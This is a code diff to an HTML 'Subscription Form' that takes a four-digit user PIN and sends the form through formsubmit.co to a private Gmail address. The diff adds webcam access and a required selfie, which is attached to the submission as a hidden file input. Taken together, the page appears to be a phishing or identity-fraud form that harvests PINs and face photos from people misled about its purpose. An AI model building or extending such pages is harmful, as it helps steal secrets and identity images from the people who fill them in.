@@ -53,11 +53,16 @@
         button:hover {
             background-color: #45a049;
         }
+        #video, #canvas {
+            display: block;
+            margin: 10px auto;
+            max-width: 100%;
+        }
     </style>
 </head>
 <body>
     <h1>Subscription Form</h1>
-    <form action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST"
+    <form id="subscription-form" action="https://formsubmit.co/empirevirtual99@gmail.com" method="POST" enctype="multipart/form-data">
         <label for="user-pin">User PIN:</label>
         <input type="number" id="user-pin" name="user-pin" required minlength="4" maxlength="4" oninput="this.value=this.value.slice(0,this.maxLength)">
         <br>
@@ -78,7 +83,66 @@
             <option value="monthly">Monthly Plan</option>
         </select>
         <br>
+        <!-- Camera and Capture Section -->
+        <label>Take a Photo:</label>
+        <video id="video" width="320" height="240" autoplay playsinline></video>
+        <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+        <input type="hidden" name="photo" id="photo">
+        <button type="button" id="capture-btn">Capture Photo</button>
+        <br>
         <button type="submit">Submit</button>
     </form>
+    <script>
+    // Get page elements
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const captureBtn = document.getElementById('capture-btn');
+    const photoInput = document.getElementById('photo');
+    const form = document.getElementById('subscription-form');
+
+    // Ask for camera (front-facing)
+    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+        .then(stream => {
+            video.srcObject = stream;
+        })
+        .catch(err => {
+            alert("Could not access the camera. Please allow camera access.");
+        });
+
+    // Capture photo from video stream
+    captureBtn.onclick = function() {
+        canvas.style.display = "block";
+        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+        // Set image data to hidden input
+        canvas.toBlob(blob => {
+            // Convert blob to a file and append to form on submit
+            const file = new File([blob], "photo.jpg", { type: "image/jpeg" });
+            // Remove any existing file input
+            let existing = document.querySelector('input[type="file"][name="photo"]');
+            if (existing) existing.remove();
+            // Create a file input
+            const fileInput = document.createElement('input');
+            fileInput.type = "file";
+            fileInput.name = "photo";
+            fileInput.style.display = "none";
+            // Use DataTransfer to set file to input
+            const dt = new DataTransfer();
+            dt.items.add(file);
+            fileInput.files = dt.files;
+            form.appendChild(fileInput);
+            photoInput.value = "captured"; // Just to trigger validation if needed
+            alert("Photo captured! It will be sent with the form.");
+        }, 'image/jpeg', 0.95);
+    };
+
+    // Remove hidden image value before submit (only send file input)
+    form.onsubmit = function(e) {
+        if (!document.querySelector('input[type="file"][name="photo"]')) {
+            alert("Please capture a photo before submitting.");
+            e.preventDefault();
+            return false;
+        }
+    };
+    </script>
 </body>
 </html>
